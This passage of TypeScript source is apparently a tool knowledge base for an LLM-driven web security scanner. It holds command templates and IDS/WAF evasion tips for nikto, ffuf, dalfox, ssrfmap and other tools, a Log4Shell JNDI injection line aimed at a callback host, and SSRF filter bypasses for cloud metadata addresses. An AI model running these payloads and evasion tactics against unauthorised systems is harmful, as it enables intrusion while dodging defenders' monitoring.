        name: "Evasive Scan (IDS Bypass)",
        description: "Scan with IDS evasion techniques enabled",
        command: "nikto -h {URL} -evasion 1234567 -Pause 2 -Format xml -o nikto-evasive.xml -nointeractive",
        useWhen: ["IDS/IPS detected", "WAF present", "Stealth scan needed", "Evasion required"],
        tags: ["evasion", "ids-bypass", "stealth", "waf"],
      },
      {
        name: "SSL/TLS Scan",
        description: "Scan HTTPS target with SSL mode forced",
        command: "nikto -h {URL} -ssl -Tuning 123 -Format xml -o nikto-ssl.xml -nointeractive",
        useWhen: ["HTTPS target", "SSL certificate check", "TLS misconfiguration"],
        tags: ["ssl", "tls", "https"],
      },
      {
        name: "CGI Directory Scan",
        description: "Comprehensive CGI directory enumeration",
        command: "nikto -h {URL} -Cgidirs all -Tuning 58 -Format xml -o nikto-cgi.xml -nointeractive",
        useWhen: ["CGI scripts suspected", "Legacy web application", "Remote file retrieval check"],
        tags: ["cgi", "legacy", "remote-file"],
      },
    ],
    pitfalls: [
      "Nikto is very noisy by default — always use -Pause for stealth",
      "Without -nointeractive, scan may hang waiting for user input",
      "Default timeout (10s) may be too short for slow targets — increase with -timeout",
      "CGI scanning (-Cgidirs all) significantly increases scan time",
      "Output format must match -o file extension or use explicit -Format",
      "Nikto does not follow redirects well — verify target URL resolves directly",
      "-maxtime is in seconds, not minutes — calculate carefully for large scans",
    ],
    evasionStrategies: [
      "Use -evasion 1 (Random URI encoding) for basic IDS bypass",
      "Use -evasion 2 (Directory self-reference /./) to confuse pattern matching",
      "Use -evasion 4 (Prepend long random string) to overflow IDS buffers",
      "Use -evasion 7 (Change URL case) to bypass case-sensitive rules",
      "Combine multiple evasion techniques: -evasion 1247 for layered bypass",
      "Add -Pause 2-5 seconds between requests to avoid rate-limit triggers",
      "Use -useproxy to route through a proxy for IP rotation",
      "Set -vhost to use virtual host header for shared hosting targets",
    ],
  },

  ffuf: {
    tool: "ffuf",
    description: "Fast web fuzzer written in Go. The current standard for content discovery, parameter fuzzing, and virtual host discovery. Faster and more flexible than gobuster/dirsearch with support for authentication, complex filtering, and recursive scanning.",
    capabilities: [
      "Directory and file brute forcing",
      "Parameter fuzzing (GET, POST, headers, cookies)",
      "Virtual host discovery",
      "Recursive scanning with configurable depth",
      "Multiple wordlist support with FUZZ keyword placement",
      "Response filtering by status, size, words, lines, regex",
      "Authentication support (cookies, headers, basic auth)",
      "Rate limiting and concurrency control",
      "Output in JSON, CSV, HTML formats",
      "Request replay from raw HTTP files",
    ],
    techniques: [
      {
        name: "Directory Discovery",
        description: "Standard directory brute forcing with status code filtering",
        command: "ffuf -u {URL}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,301,302,403 -o output.json -of json",
        useWhen: ["Initial content discovery", "Finding hidden directories", "Mapping application structure"],
        tags: ["directory", "content-discovery", "brute-force"],
      },
      {
        name: "Extension Fuzzing",
        description: "Discover files with specific extensions",
        command: "ffuf -u {URL}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.asp,.aspx,.jsp,.html,.js,.txt,.bak,.old,.conf -mc 200,301,302 -o output.json -of json",
        useWhen: ["Looking for backup files", "Finding config files", "Technology-specific file discovery"],
        tags: ["extensions", "backup-files", "config-files"],
      },
      {
        name: "Parameter Fuzzing (GET)",
        description: "Discover hidden GET parameters on known endpoints",
        command: "ffuf -u {URL}?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs {baseline_size} -o output.json -of json",
        useWhen: ["Finding hidden parameters", "Testing for IDOR", "Discovering debug parameters"],
        tags: ["parameters", "idor", "debug"],
      },
      {
        name: "Virtual Host Discovery",
        description: "Find virtual hosts on the same IP",
        command: "ffuf -u {URL} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs {baseline_size} -o output.json -of json",
        useWhen: ["Finding hidden vhosts", "Internal application discovery", "Shared hosting enumeration"],
        tags: ["vhost", "virtual-host", "subdomain"],
      },
      {
        name: "POST Data Fuzzing",
        description: "Fuzz POST parameters for hidden functionality",
        command: "ffuf -u {URL} -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs {baseline_size}",
        useWhen: ["Testing POST endpoints", "Finding hidden form parameters", "API parameter discovery"],
        tags: ["post", "parameters", "api"],
      },
      {
        name: "Recursive Content Discovery",
        description: "Recursive directory scanning with depth control",
        command: "ffuf -u {URL}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302 -recursion -recursion-depth 3 -rate 50 -o output.json -of json",
        useWhen: ["Deep directory mapping", "Finding nested application paths", "Comprehensive content discovery"],
        tags: ["recursive", "deep-scan", "comprehensive"],
      },
      {
        name: "Authenticated Fuzzing",
        description: "Content discovery with authentication cookies",
        command: "ffuf -u {URL}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b '{COOKIE}' -mc 200,301,302,403 -o output.json -of json",
        useWhen: ["Post-authentication discovery", "Finding admin panels", "Authenticated content mapping"],
        tags: ["authenticated", "cookies", "admin"],
      },
    ],
    pitfalls: [
      "Default settings are VERY aggressive — always set -rate and -t for bug bounty programs",
      "Use -fs (filter size) to remove false positives from custom 404 pages",
      "FUZZ keyword placement determines what gets fuzzed — verify placement before running",
      "Recursive mode can generate massive traffic — use -recursion-depth to limit",
      "Some WAFs block ffuf's default User-Agent — use -H to set a browser UA",
      "Always calibrate baseline response size first with -mc all then filter",
    ],
    evasionStrategies: [
      "Set -rate 10-50 to stay under WAF rate limits",
      "Use -H 'User-Agent: Mozilla/5.0...' to mimic browser traffic",
      "Add -p 0.5-2.0 for random delay between requests",
      "Use -replay-proxy to route through Burp for manual verification",
      "Rotate wordlists between scans to avoid pattern detection",
    ],
  },

  katana: {
    tool: "katana",
    description: "Next-generation web crawler by ProjectDiscovery that handles JavaScript-heavy SPAs. Uses headless Chrome for JS execution, making it critical for modern web apps where traditional crawlers miss most of the attack surface.",
    capabilities: [
      "JavaScript execution via headless Chrome",
      "Standard and headless crawling modes",
      "Automatic form filling and submission",
      "Scope control with regex patterns",
      "Depth and page limit controls",
      "Output filtering by extension and pattern",
      "Integration with ProjectDiscovery toolchain",
      "Passive mode for JS file analysis without live crawling",
    ],
    techniques: [
      {
        name: "Headless JS Crawl",
        description: "Full JavaScript-rendered crawling for SPAs",
        command: "katana -u {URL} -headless -depth 5 -js-crawl -known-files all -jsonl",
        useWhen: ["React/Angular/Vue applications", "JavaScript-heavy targets", "SPA attack surface mapping"],
        tags: ["spa", "javascript", "headless", "react", "angular", "vue"],
      },
      {
        name: "Passive JS Analysis",
        description: "Extract endpoints from JavaScript without live crawling",
        command: "katana -u {URL} -passive -depth 3 -ef css,png,jpg,gif,svg,woff -jsonl",
        useWhen: ["Stealthy reconnaissance", "JS endpoint extraction", "API discovery from client code"],
        tags: ["passive", "javascript", "endpoints", "api"],
      },
      {
        name: "Scoped Deep Crawl",
        description: "Deep crawl restricted to target scope",
        command: "katana -u {URL} -depth 10 -scope-filter '.*\\.{DOMAIN}$' -form-fill -known-files all -rate-limit 20 -jsonl",
        useWhen: ["Comprehensive application mapping", "Finding all endpoints within scope", "Form discovery"],
        tags: ["deep", "scoped", "forms", "comprehensive"],
      },
    ],
    pitfalls: [
      "Headless mode is resource-intensive — limit concurrency on shared infrastructure",
      "JS execution can trigger application side effects — use read-only mode where possible",
      "Scope filtering is critical to avoid crawling out of bug bounty scope",
      "Rate limiting is essential — headless crawling generates many requests per page",
    ],
    evasionStrategies: [
      "Use -rate-limit to control request frequency",
      "Set custom User-Agent to match real browser fingerprints",
      "Use -delay for random delays between page loads",
      "Passive mode generates zero traffic to the target",
    ],
  },

  dalfox: {
    tool: "dalfox",
    description: "Specialized XSS scanner that outperforms generic scanners for cross-site scripting detection. Supports parameter analysis, DOM-based XSS, blind XSS with callback, and WAF bypass payloads.",
    capabilities: [
      "Reflected XSS detection",
      "Stored XSS detection with verification",
      "DOM-based XSS analysis",
      "Blind XSS with callback server",
      "WAF fingerprinting and bypass payloads",
      "Parameter mining from multiple sources",
      "Custom payload injection",
      "Pipeline integration (stdin URL list)",
    ],
    techniques: [
      {
        name: "URL Parameter XSS Scan",
        description: "Scan URL parameters for reflected XSS",
        command: "dalfox url '{URL}?param=test' --silence --format json",
        useWhen: ["Testing URL parameters for reflection", "Known reflective endpoints", "Form action URLs"],
        tags: ["xss", "reflected", "parameters"],
      },
      {
        name: "Pipeline XSS Scan",
        description: "Scan multiple URLs from a file",
        command: "dalfox file urls.txt --silence --format json --worker 10 --delay 100",
        useWhen: ["Bulk XSS testing", "Post-crawl XSS verification", "Testing gau/katana output"],
        tags: ["xss", "bulk", "pipeline"],
      },
      {
        name: "Blind XSS with Callback",
        description: "Test for blind XSS using out-of-band callback",
        command: "dalfox url '{URL}' --blind {CALLBACK_URL} --silence --format json",
        useWhen: ["Testing admin panels", "Form submissions viewed by admins", "Stored input fields"],
        tags: ["xss", "blind", "stored", "oob"],
      },
      {
        name: "WAF Bypass XSS",
        description: "XSS testing with WAF evasion payloads",
        command: "dalfox url '{URL}' --waf-evasion --silence --format json",
        useWhen: ["WAF-protected targets", "Cloudflare/Akamai/AWS WAF detected", "Initial XSS payloads blocked"],
        tags: ["xss", "waf-bypass", "evasion"],
      },
    ],
    pitfalls: [
      "Default payloads may trigger WAF bans — start with --waf-evasion on protected targets",
      "Blind XSS requires a callback server — use interactsh or custom server",
      "High false positive rate on some targets — always verify manually",
      "Rate limit with --delay to avoid bans on bug bounty programs",
    ],
    evasionStrategies: [
      "Use --waf-evasion for automatic WAF bypass payload generation",
      "Set --delay 200-500 to avoid rate limiting",
      "Use --custom-payload with encoding variations",
      "Combine with interactsh for blind XSS callback infrastructure",
    ],
  },

  interactsh: {
    tool: "interactsh",
    description: "Out-of-band (OOB) testing infrastructure by ProjectDiscovery. Provides DNS, HTTP, SMTP, and LDAP callback servers for detecting blind vulnerabilities (SSRF, XXE, blind injection, log4shell). Free, self-hostable, critical for modern bug bounty work.",
    capabilities: [
      "DNS callback detection",
      "HTTP callback with request logging",
      "SMTP callback for email-based OOB",
      "LDAP callback for JNDI injection (Log4Shell)",
      "Unique per-test interaction URLs",
      "Correlation ID tracking",
      "Integration with nuclei and other PD tools",
      "Self-hosted or cloud-hosted modes",
    ],
    techniques: [
      {
        name: "SSRF Detection",
        description: "Use OOB callback to confirm SSRF vulnerabilities",
        command: "interactsh-client -v | tee interactions.log & # Then inject {INTERACTSH_URL} into SSRF-susceptible parameters",
        useWhen: ["Testing URL parameters that fetch remote resources", "Webhook URL inputs", "Image/file URL inputs"],
        tags: ["ssrf", "oob", "callback"],
      },
      {
        name: "Blind XXE Detection",
        description: "Use OOB DNS/HTTP callback to confirm blind XXE",
        command: "# Inject XXE payload with interactsh URL as exfiltration endpoint",
        useWhen: ["XML file upload endpoints", "SOAP/XML API endpoints", "SVG upload functionality"],
        tags: ["xxe", "oob", "blind", "xml"],
      },
      {
        name: "Log4Shell Detection",
        description: "JNDI/LDAP callback for Log4j vulnerability detection",
        command: "# Inject ${jndi:ldap://{INTERACTSH_URL}/test} into headers, parameters, user-agents",
        useWhen: ["Java applications", "Any input that may be logged", "Header injection points"],
        tags: ["log4j", "jndi", "ldap", "java"],
      },
    ],
    pitfalls: [
      "Cloud-hosted interactsh URLs may be blocked by WAFs — self-host for reliable testing",
      "Interaction correlation requires careful tracking of which payload triggered which callback",
      "DNS callbacks may be delayed — wait sufficient time before concluding negative",
      "Some targets block outbound DNS — HTTP callbacks may work when DNS doesn't",
    ],
    evasionStrategies: [
      "Self-host interactsh on a custom domain to avoid WAF blocklists",
      "Use DNS-only callbacks when HTTP is blocked",
      "Encode callback URLs to bypass input validation",
      "Use subdomain-based correlation IDs for tracking",
    ],
  },

  ssrfmap: {
    tool: "ssrfmap",
    description: "Automated SSRF exploitation framework. Tests for SSRF across cloud metadata endpoints (AWS, GCP, Azure), internal services, and protocol handlers. Supports multiple SSRF techniques and post-exploitation.",
    capabilities: [
      "Cloud metadata endpoint testing (AWS IMDSv1/v2, GCP, Azure, DigitalOcean)",
      "Internal network port scanning via SSRF",
      "Protocol handler testing (file://, gopher://, dict://)",
      "Redirect-based SSRF bypass",
      "DNS rebinding support",
      "Post-exploitation (credential extraction, internal service access)",
    ],
    techniques: [
      {
        name: "Cloud Metadata Extraction",
        description: "Test SSRF for cloud metadata access",
        command: "python3 ssrfmap.py -r request.txt -p url -m readfiles,portscan,aws,gce,digitalocean",
        useWhen: ["Cloud-hosted targets", "URL fetch parameters", "Webhook/callback inputs"],
        tags: ["ssrf", "cloud", "metadata", "aws", "gcp", "azure"],
      },
      {
        name: "Internal Port Scan",
        description: "Use SSRF to scan internal network",
        command: "python3 ssrfmap.py -r request.txt -p url -m portscan --lhost 127.0.0.1 --lport 1-10000",
        useWhen: ["Confirmed SSRF", "Internal network mapping", "Service discovery behind firewall"],
        tags: ["ssrf", "portscan", "internal", "network"],
      },
    ],
    pitfalls: [
      "AWS IMDSv2 requires a token — test both v1 and v2 endpoints",
      "Many SSRF filters block 169.254.169.254 — use alternative representations (decimal IP, IPv6)",
      "Gopher protocol is powerful but rarely available on modern targets",
      "Always verify SSRF impact — not all SSRF leads to data exfiltration",
    ],
    evasionStrategies: [
      "Use URL encoding to bypass input validation",
      "Use redirect chains to bypass allowlist checks",
      "Use DNS rebinding to bypass IP-based filters",
      "Use alternative IP representations (0x7f000001, 2130706433, 0177.0.0.1)",
      "Use IPv6 representations (::1, 0:0:0:0:0:ffff:127.0.0.1)",
    ],
  },

  alterx: {
    tool: "alterx",
    description: "Subdomain permutation generator by ProjectDiscovery. Generates plausible subdomain variations from known patterns. If you've found api.target.com and admin.target.com, alterx generates api-staging, admin-dev, api-internal that may exist but weren't in passive sources.",
    capabilities: [
      "Pattern-based subdomain permutation",
      "Word-based permutation with custom wordlists",
      "Automatic pattern extraction from known subdomains",
      "Integration with dnsx for resolution",
      "Custom template support",
    ],
    techniques: [
      {
        name: "Pattern-Based Permutation",
        description: "Generate permutations from known subdomain patterns",
        command: "echo '{KNOWN_SUBS}' | alterx -enrich | dnsx -silent",
        useWhen: ["After initial subdomain enumeration", "Finding staging/dev variants", "Expanding known patterns"],
        tags: ["subdomain", "permutation", "pattern"],
      },
      {
        name: "Wordlist Permutation",
        description: "Generate permutations using custom wordlist",
        command: "echo '{KNOWN_SUBS}' | alterx -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx -silent",
        useWhen: ["Comprehensive subdomain expansion", "Finding common naming patterns", "Large-scale enumeration"],
        tags: ["subdomain", "wordlist", "comprehensive"],
      },
    ],
    pitfalls: [
      "Output can be massive — always pipe through dnsx to filter live subdomains",
      "Permutation quality depends on input quality — provide diverse known subdomains",
      "DNS brute forcing with permutations can be noisy — rate limit dnsx",
    ],
    evasionStrategies: [
      "Passive technique — generates names without touching the target",
      "Rate limit the subsequent dnsx resolution to avoid detection",
    ],
  },

  puredns: {
    tool: "puredns",
    description: "DNS brute forcing tool that wraps massdns with proper wildcard handling. Finds subdomains that don't appear in any passive source. Combined with good wordlists, discovers assets no passive method can find.",
    capabilities: [
      "DNS brute forcing with wildcard detection",
      "Wildcard filtering to eliminate false positives",
      "Trusted resolver validation",
      "High-speed resolution via massdns",
      "Wordlist-based and stdin-based input",
    ],
    techniques: [
      {
        name: "DNS Brute Force",
        description: "Brute force subdomains with wildcard filtering",
        command: "puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt {DOMAIN} -r resolvers.txt --wildcard-batch 1000",
        useWhen: ["After passive enumeration", "Finding non-indexed subdomains", "Comprehensive subdomain discovery"],
        tags: ["dns", "brute-force", "subdomain", "wildcard"],
      },
      {
        name: "Resolve and Validate",
        description: "Validate a list of potential subdomains",
        command: "puredns resolve subdomains.txt -r resolvers.txt --wildcard-batch 1000",
        useWhen: ["Validating alterx output", "Filtering enumeration results", "Removing dead subdomains"],
        tags: ["dns", "resolve", "validate", "filter"],
      },
    ],
    pitfalls: [
      "Requires good resolver list — stale resolvers cause false negatives",
      "Wildcard detection is critical — without it, wildcard domains flood results",
      "DNS brute forcing is noisy — some programs forbid it explicitly",
      "massdns dependency must be installed separately",
    ],
    evasionStrategies: [
      "Use trusted public resolvers to avoid poisoned DNS responses",
      "Rate limit resolution to avoid triggering DNS monitoring",
      "Use multiple resolver sources for validation",
    ],
  },

  subjack: {
    tool: "subjack",
    description: "Subdomain takeover detection tool. Checks for dangling CNAME records pointing to deregistered services (S3, Heroku, GitHub Pages, Azure, etc.). Subdomain takeovers are consistently high-severity bug bounty findings.",
    capabilities: [
      "CNAME-based subdomain takeover detection",
      "Fingerprint matching for 30+ cloud services",
      "Concurrent checking at scale",
      "Custom fingerprint support",
      "HTTPS verification",
    ],
    techniques: [
      {
        name: "Subdomain Takeover Scan",
        description: "Check subdomains for takeover vulnerabilities",
        command: "subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c /opt/subjack/fingerprints.json -v",
        useWhen: ["After subdomain enumeration", "Checking for dangling CNAMEs", "Cloud service deprovisioning"],
        tags: ["takeover", "subdomain", "cname", "cloud"],
      },
    ],
    pitfalls: [
      "False positives are common — always verify manually before reporting",
      "Fingerprint database needs regular updates as services change",
      "Some takeovers require actual registration of the dangling resource to confirm",
      "Run multiple takeover tools (subjack, subzy, nuclei takeover templates) for coverage",
    ],
    evasionStrategies: [
      "Passive technique — only performs DNS lookups and HTTP checks",
      "Rate limit with -t flag to control concurrency",
    ],
  },
};

/**
 * Technology-to-Nuclei-tags mapping for automatic template selection
 */
export const NUCLEI_TECH_TAG_MAP: Record<string, string[]> = {
  // CMS platforms
  wordpress: ["wordpress", "wp-plugin", "wp-theme", "wpscan"],
  joomla: ["joomla"],
  drupal: ["drupal"],
  magento: ["magento"],
  shopify: ["shopify"],
  ghost: ["ghost"],
  typo3: ["typo3"],
  // Web servers
  apache: ["apache", "httpd"],
  nginx: ["nginx"],
  iis: ["iis", "microsoft", "asp"],
  tomcat: ["tomcat", "java"],
  lighttpd: ["lighttpd"],
  caddy: ["caddy"],
  // Frameworks
  laravel: ["laravel", "php"],
  django: ["django", "python"],
  flask: ["flask", "python"],
  spring: ["spring", "java", "springboot"],
  struts: ["struts", "java"],
  rails: ["rails", "ruby"],
  express: ["express", "nodejs"],
  nextjs: ["nextjs", "nodejs"],
  // Languages
  php: ["php"],
  java: ["java", "tomcat", "spring"],
  python: ["python", "django", "flask"],
  ruby: ["ruby", "rails"],
  nodejs: ["nodejs", "express"],
  asp: ["asp", "iis", "microsoft"],
  // Databases
  mysql: ["mysql"],
  postgresql: ["postgresql", "postgres"],
  mongodb: ["mongodb"],
  redis: ["redis"],
  elasticsearch: ["elasticsearch", "elastic"],
  mssql: ["mssql", "microsoft"],
  // CI/CD & DevOps
  jenkins: ["jenkins"],
  gitlab: ["gitlab"],
  grafana: ["grafana"],
  kibana: ["kibana"],
  prometheus: ["prometheus"],
  sonarqube: ["sonarqube"],
  docker: ["docker"],
  kubernetes: ["kubernetes", "k8s"],
  // Cloud
  aws: ["aws", "amazon"],
  azure: ["azure", "microsoft"],
  gcp: ["gcp", "google"],
  // Panels & Services
  phpmyadmin: ["phpmyadmin"],
  cpanel: ["cpanel"],
  webmin: ["webmin"],
  confluence: ["confluence", "atlassian"],
  jira: ["jira", "atlassian"],
  bitbucket: ["bitbucket", "atlassian"],
};

/**
 * Nikto tuning profiles by scan objective
 */
export const NIKTO_TUNING_PROFILES: Record<string, { tuning: string; description: string; evasion?: string }> = {
  quick: {
    tuning: "12b",
    description: "Interesting files, misconfigs, and software identification",
  },
  injection: {
    tuning: "489",
    description: "XSS, SQL injection, command execution, and file upload",
  },
  disclosure: {
    tuning: "3",
    description: "Information disclosure only",
  },
  comprehensive: {
    tuning: "123456789abc",
    description: "All scan categories for maximum coverage",
  },
  stealth: {
    tuning: "12b",
    description: "Quick scan with IDS evasion enabled",
    evasion: "1247",
  },
  authBypass: {
    tuning: "a",
    description: "Authentication bypass checks only",
  },
  remoteFile: {
    tuning: "57",
    description: "Remote file retrieval (inside web root and server-wide)",
  },
  rce: {
    tuning: "8",
    description: "Command execution and remote shell checks",
  },
};

/**
 * Get Nuclei tags for a detected technology
 */
export function getNucleiTagsForTech(technologies: string[]): string[] {
  const tags = new Set<string>();
  for (const tech of technologies) {
    const normalized = tech.toLowerCase().replace(/[^a-z0-9]/g, "");
    // Direct match
    if (NUCLEI_TECH_TAG_MAP[normalized]) {
      for (const tag of NUCLEI_TECH_TAG_MAP[normalized]) tags.add(tag);
    }
    // Partial match (e.g., "Apache/2.4.51" → "apache")
    for (const [key, tagList] of Object.entries(NUCLEI_TECH_TAG_MAP)) {
      if (normalized.includes(key) || key.includes(normalized)) {
        for (const tag of tagList) tags.add(tag);
      }
    }
  }
  return Array.from(tags);
}

/**
 * Build Nuclei command with technology-aware template selection
 */
export function buildNucleiCommand(options: {
  target: string;
  technologies?: string[];
  severity?: string;
  authenticated?: boolean;
  cookie?: string;
  wafDetected?: boolean;
  scanDepth?: "quick" | "standard" | "deep";
}): string {
  const { target, technologies, severity, authenticated, cookie, wafDetected, scanDepth = "standard" } = options;
  const parts: string[] = ["nuclei", "-u", target];

  // Technology-based tag selection
  if (technologies && technologies.length > 0) {
    const tags = getNucleiTagsForTech(technologies);
    if (tags.length > 0) {
      parts.push("-tags", tags.slice(0, 10).join(","));
    }
  } else {
    // Use automatic selection when no tech info available
    parts.push("-as");
  }

  // Severity filter
  if (severity) {
    parts.push("-severity", severity);
  } else if (scanDepth === "quick") {
    parts.push("-severity", "critical,high");
  }

  // Authentication
  if (authenticated && cookie) {
    parts.push("-H", `"Cookie: ${cookie}"`);
  }

  // Rate limiting for WAF targets
  if (wafDetected) {
    parts.push("-rl", "15", "-c", "5", "-timeout", "15");
  } else if (scanDepth === "deep") {
    parts.push("-rl", "50", "-c", "25");
  } else {
    parts.push("-rl", "100", "-c", "25");
  }

  // Standard flags
  parts.push("-nc", "-duc", "-ni", "-jsonl");

  return parts.join(" ");
}

/**
 * Build Nikto command with tuning profile and context awareness
 */
export function buildNiktoCommand(options: {
  target: string;
  tuningProfile?: keyof typeof NIKTO_TUNING_PROFILES;
  authenticated?: boolean;
  credentials?: { user: string; pass: string };
  cookie?: string;
  wafDetected?: boolean;
  ssl?: boolean;
  maxTime?: number;
  outputFile?: string;
}): string {
  const {
    target,
    tuningProfile = "quick",
    authenticated,
    credentials,
    cookie,
    wafDetected,
    ssl,
    maxTime,
    outputFile = "nikto-output.xml",
  } = options;

  const profile = NIKTO_TUNING_PROFILES[tuningProfile] || NIKTO_TUNING_PROFILES.quick;
  const parts: string[] = ["nikto", "-h", target];

  // Tuning
  parts.push("-Tuning", profile.tuning);

  // SSL
  if (ssl || target.startsWith("https")) {
    parts.push("-ssl");
  }

  // Authentication
  if (authenticated && credentials) {
    parts.push("-id", `${credentials.user}:${credentials.pass}`);
  }

  // Cookie injection (for session-based auth)
  if (cookie) {
    // Nikto doesn't have a native -c flag; use custom header approach via config
    // The orchestrator injects this via the scan server's nikto.conf or -H flag
    parts.push("-H", `"Cookie: ${cookie}"`);
  }

  // Evasion (from profile or WAF detection)
  const evasion = profile.evasion || (wafDetected ? "1247" : undefined);
  if (evasion) {
    parts.push("-evasion", evasion);
  }

  // Rate limiting for WAF
  if (wafDetected) {
    parts.push("-Pause", "3");
  }

  // Max time
  if (maxTime) {
    parts.push("-maxtime", String(maxTime));
  }

  // Output
  parts.push("-Format", "xml", "-o", outputFile, "-nointeractive");

  return parts.join(" ");
}

/**
 * Get contextual tool knowledge for a specific tool
 */
export function getToolKnowledge(tool: string): ToolKnowledge | undefined {
  return TOOL_KNOWLEDGE_BASE[tool.toLowerCase()];
}

/**
 * Get relevant techniques for a tool based on context tags
 */
export function getRelevantTechniques(
  tool: string,
  contextTags: string[]
): ToolTechnique[] {
  const knowledge = TOOL_KNOWLEDGE_BASE[tool.toLowerCase()];
  if (!knowledge) return [];

  const lowerTags = contextTags.map(t => t.toLowerCase());
  return knowledge.techniques.filter(technique =>
    technique.tags.some(tag => lowerTags.includes(tag))
  );
}

/**
 * Get evasion strategies for a tool when WAF/IDS is detected
 */
export function getEvasionStrategies(tool: string): string[] {
  const knowledge = TOOL_KNOWLEDGE_BASE[tool.toLowerCase()];
  return knowledge?.evasionStrategies || [];
}

/**
 * Build LLM context block with tool knowledge for scan planning
 */
export function buildToolKnowledgeContext(
  tools: string[],
  context: { wafDetected?: boolean; technologies?: string[]; hasCredentials?: boolean }
): string {
  const blocks: string[] = [];

  for (const tool of tools) {
    const knowledge = TOOL_KNOWLEDGE_BASE[tool.toLowerCase()];
    if (!knowledge) continue;

    const lines: string[] = [`### ${knowledge.tool.toUpperCase()}`];
    lines.push(`${knowledge.description}`);

    // Add relevant techniques based on context
    const contextTags: string[] = [];
    if (context.wafDetected) contextTags.push("waf", "evasion", "stealth");
    if (context.hasCredentials) contextTags.push("authenticated", "post-auth", "cookie");
    if (context.technologies?.some(t => /php/i.test(t))) contextTags.push("extensions", "php");
    if (context.technologies?.some(t => /asp|iis/i.test(t))) contextTags.push("extensions", "asp");
    if (context.technologies?.some(t => /java|tomcat/i.test(t))) contextTags.push("extensions", "java");

    const relevant = contextTags.length > 0
      ? getRelevantTechniques(tool, contextTags)
      : knowledge.techniques.slice(0, 3);

    if (relevant.length > 0) {
      lines.push("Recommended techniques:");
      for (const tech of relevant) {
        lines.push(`- ${tech.name}: ${tech.command}`);
      }
    }

    if (context.wafDetected && knowledge.evasionStrategies.length > 0) {
      lines.push("Evasion strategies:");
      for (const strategy of knowledge.evasionStrategies.slice(0, 3)) {
        lines.push(`- ${strategy}`);
      }
    }

    if (knowledge.pitfalls.length > 0) {
      lines.push("Avoid:");
      for (const pitfall of knowledge.pitfalls.slice(0, 2)) {
        lines.push(`- ${pitfall}`);
      }
    }

    blocks.push(lines.join("\n"));
  }

  return blocks.join("\n\n");
}

/**
 * Get formatted tool context for LLM prompts (convenience wrapper)
 */
export function getToolContextForLLM(tools: string[]): string {
  return buildToolKnowledgeContext(tools, {});
}
